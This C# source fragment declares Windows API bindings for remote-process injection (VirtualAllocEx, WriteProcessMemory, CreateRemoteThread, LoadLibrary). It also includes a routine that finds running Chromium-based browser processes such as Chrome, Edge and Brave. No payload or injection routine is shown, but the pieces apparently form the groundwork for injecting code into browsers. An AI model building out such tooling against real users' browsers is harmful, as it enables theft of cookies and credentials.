using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal static class Api {
    [DllImport("kernel32.dll", SetLastError = true)] internal static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] internal static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll", SetLastError = true)] internal static extern IntPtr VirtualAllocEx(IntPtr process, IntPtr address, UIntPtr size, uint allocation, uint protection);
    [DllImport("kernel32.dll", SetLastError = true)] internal static extern bool VirtualFreeEx(IntPtr process, IntPtr address, UIntPtr size, uint free);
    [DllImport("kernel32.dll", SetLastError = true)] internal static extern bool WriteProcessMemory(IntPtr process, IntPtr address, byte[] data, UIntPtr size, out UIntPtr written);
    [DllImport("kernel32.dll", SetLastError = true)] internal static extern IntPtr CreateRemoteThread(IntPtr process, IntPtr attributes, UIntPtr stackSize, IntPtr start, IntPtr parameter, uint flags, IntPtr threadId);
    [DllImport("kernel32.dll")] internal static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds);
    [DllImport("kernel32.dll")] internal static extern bool CloseHandle(IntPtr handle);
    internal delegate bool EnumProc(IntPtr window, IntPtr parameter);
    [DllImport("user32.dll")] internal static extern bool EnumWindows(EnumProc callback, IntPtr parameter);
    [DllImport("user32.dll")] internal static extern bool IsWindowVisible(IntPtr window);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] internal static extern int GetClassName(IntPtr window, StringBuilder name, int size);
    [DllImport("user32.dll")] internal static extern uint GetWindowThreadProcessId(IntPtr window, out uint process);
    [DllImport("user32.dll", SetLastError = true)] internal static extern bool PostMessage(IntPtr window, uint message, IntPtr wp, IntPtr lp);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] internal static extern IntPtr LoadLibrary(string path);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)] internal static extern IntPtr GetProcAddress(IntPtr module, string name);
    [DllImport("kernel32.dll")] internal static extern bool FreeLibrary(IntPtr module);
    [DllImport("kernel32.dll", SetLastError = true)] internal static extern bool IsWow64Process(IntPtr process, out bool wow);
    internal static List<BrowserItem> Browsers() {
        var result = new List<BrowserItem>(); var seen = new HashSet<uint>();
        EnumWindows(delegate(IntPtr window, IntPtr unused) {
            if (!IsWindowVisible(window)) return true;
            var name = new StringBuilder(256); GetClassName(window, name, 256);
            if (name.ToString() != "Chrome_WidgetWin_1") return true;
            uint pid; GetWindowThreadProcessId(window, out pid);
            if (seen.Contains(pid)) return true;
            try { using (var p = Process.GetProcessById((int)pid)) {
                if (Array.IndexOf(new[] { "chrome", "msedge", "brave", "opera", "comet", "maxthon", "whale", "aloha", "thorium" }, p.ProcessName.ToLowerInvariant()) >= 0) {
                    seen.Add(pid); result.Add(new BrowserItem { Pid = (int)pid, Window = window, Name = p.ProcessName });
                }
            } } catch (ArgumentException) { } catch (System.ComponentModel.Win32Exception) { }
            return true;
        }, IntPtr.Zero);
        return result;
    }
}
